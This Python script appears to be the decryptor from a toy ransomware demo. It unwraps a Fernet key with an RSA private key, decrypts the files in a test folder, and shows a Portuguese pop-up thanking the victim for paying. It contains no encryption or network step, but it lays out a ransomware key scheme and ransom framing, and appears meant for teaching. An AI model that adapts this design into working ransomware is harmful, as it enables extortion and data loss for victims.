from cryptography.fernet import Fernet
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding

from common import list_files, show_pop_up, PRIVATE_ASYM_KEY_FILENAME, SYM_KEY_FILENAME

import os


TEST_DIR_TO_ENCRYPT = f"{os.path.dirname(os.path.abspath(__file__))}/agentes_secretos"


def read_private_key(filename):
    with open(filename, "rb") as key_file:
        private_key = serialization.load_pem_private_key(
            key_file.read(),
            password=None,
            backend=default_backend()
        )

    return private_key


def decrypt_sym_key(sym_key_filename, private_key):
    with open(sym_key_filename, "rb") as encrypted_file:
        sym_key_file_data = encrypted_file.read()

    sym_key = private_key.decrypt(
        sym_key_file_data,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

    return sym_key


def decrypt_file(filename, key):
    with open(filename, "rb") as file_to_decrypt:
        file_data = file_to_decrypt.read()

    decrypted_data = Fernet(key).decrypt(file_data)

    with open(filename, "wb") as decrypted_file:
        decrypted_file.write(decrypted_data)


def main():
    private_key = read_private_key(PRIVATE_ASYM_KEY_FILENAME)

    sym_key = decrypt_sym_key(SYM_KEY_FILENAME, private_key)

    filenames_list = list_files(TEST_DIR_TO_ENCRYPT)

    for filename in filenames_list:
        decrypt_file(filename,  sym_key)

    show_pop_up("Obrigado pelo dinheiro!", "Seus arquivos de gatinhos agora estão desencriptados :)")


if __name__ == "__main__":
    main()
